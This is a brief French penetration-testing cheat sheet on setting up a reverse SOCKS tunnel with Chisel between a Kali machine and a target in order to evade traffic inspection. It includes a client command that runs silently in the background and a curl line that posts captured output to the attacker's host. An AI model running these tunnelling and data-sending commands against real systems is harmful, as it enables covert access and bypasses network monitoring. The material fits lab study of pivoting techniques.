Chisel permet des pont en http pure afin de passer à travers des logiciels d'analyse de trafic.

Fonctionnement :
Sur Kali, on démarre un serveur Chisel et sur la cible, le client

# Lancement du serveur sur Kali 
```
chisel server --port <PORT KALI> --reverse
```
# Lancement du client 
```
chisel client <IP KALI>:<PORT KALI> R:socks > /dev/null 2>&1 &
```
# Pour récupérer avec tcpdump les messages d'erreurs éventuel :
```
chisel client <IP KALI>:<PORT KALI> R:socks &> /tmp/output; curl --data @/tmp/output http://<IP KALI>:<PORT KALI>/
```
On lance avant sur Kali tcpdump :
```
sudo tcpdump -nvvvXi tun0 tcp port <PORT KALI>
```

```
```